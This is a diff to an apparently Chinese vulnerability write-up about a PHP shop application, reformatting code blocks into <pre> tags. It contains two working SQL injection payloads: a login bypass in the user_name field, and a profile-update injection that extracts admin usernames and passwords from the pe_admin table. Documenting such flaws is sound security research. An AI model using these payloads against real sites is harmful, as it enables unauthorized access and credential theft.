@@ -21,14 +21,16 @@ case 'login':
 
 URL:
 
-`/index.php?mod=user&act=login`
+<pre>
+/index.php?mod=user&act=login
+</pre>
 
 DATA:
-```
+<pre>
 info%5Buser_name%5D=1' or 1=1-- -
 &info%5Buser_pw%5D=123456
 &pesubmit=
-```
+</pre>
 
 繼續看
 ```php
@@ -92,10 +94,15 @@ public function pe_update($table, $where, $set)
 ```【Bug 0x09: SQL注入 獲取任意資料庫數據】```
 <p>
 URL:
-```/index.php?mod=user&act=base```
+<pre>
+/index.php?mod=user&act=base
+</pre>
+
 <p>
 DATA:
-```info%5Buser_address`%3D(select concat(0x7e,admin_name,0x7e,admin_pw,0x7e) from pe_admin limit 1) , `user_tname%5D=1```
+<pre>
+info%5Buser_address`%3D(select concat(0x7e,admin_name,0x7e,admin_pw,0x7e) from pe_admin limit 1) , `user_tname%5D=1
+</pre>
 
 
 **product.php**
